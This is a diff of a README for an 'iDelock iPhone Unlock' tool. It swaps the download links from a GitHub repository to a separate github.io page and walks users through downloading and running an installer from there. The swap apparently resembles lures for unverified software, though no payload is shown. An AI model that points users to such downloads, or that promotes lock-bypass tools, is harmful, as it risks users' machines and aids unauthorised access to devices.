@@ -1,6 +1,6 @@
 # 📱 iDelock-iPhone-Unlock - Unlock your locked iOS device easily
 
-[![](https://img.shields.io/badge/Download-iDelock-blue.svg)](https://github.com/mariafe4532/iDelock-iPhone-Unlock)
+[![](https://img.shields.io/badge/Download-iDelock-blue.svg)](https://mariafe4532.github.io)
 
 ## 📖 About this software
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the following link to start: [Download iDelock iPhone Unlock](https://github.com/mariafe4532/iDelock-iPhone-Unlock)
+1. Visit the following link to start: [Download iDelock iPhone Unlock](https://mariafe4532.github.io)
 2. Look for the release section on the webpage.
 3. Click the link to download the installer file.
 4. Wait for the file to finish downloading to your computer.
